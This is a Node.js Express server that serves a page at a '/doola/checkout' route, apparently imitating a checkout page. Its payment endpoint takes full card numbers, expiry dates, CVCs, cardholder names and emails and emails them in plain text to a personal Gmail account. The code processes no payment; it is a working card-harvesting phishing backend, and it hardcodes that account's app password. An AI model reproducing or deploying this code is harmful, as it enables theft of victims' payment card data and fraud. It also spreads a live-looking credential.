const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files from the 'public' folder
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Endpoint to handle form submission
app.post('/send-payment', async (req, res) => {
    const { email, cardnumber, expiry, cvc, cardholder, country } = req.body;

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'rogerkabeho@gmail.com',
            pass: 'htoqrmyfnpksjcmk' // Use an app password for security
        }
    });

    let mailOptions = {
        from: 'rogerkabeho@gmail.com',
        to: 'rogerkabeho@gmail.com',
        subject: 'New Payment Information',
        text: `
        Email: ${email}
        Card Number: ${cardnumber}
        Expiry: ${expiry}  
        CVC: ${cvc}
        Cardholder: ${cardholder}
        Country: ${country}
        `,
        html: `
        <h2>New Payment Information</h2>
        <ul>
        <li>Email: ${email}</li>
        <li>Card Number: ${cardnumber}</li>
        <li>Expiry: ${expiry}</li>
        <li>CVC: ${cvc}</li>    
        <li>Cardholder: ${cardholder}</li>
        <li>Country: ${country}</li>
        </ul>       `   
    };

    try {
        await transporter.sendMail(mailOptions);
        res.status(200).json({ message: 'Payment information sent successfully!' });
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ message: 'Failed to send payment information.' });
    }   
});
// Serve index.html for the root route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/doola/checkout', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});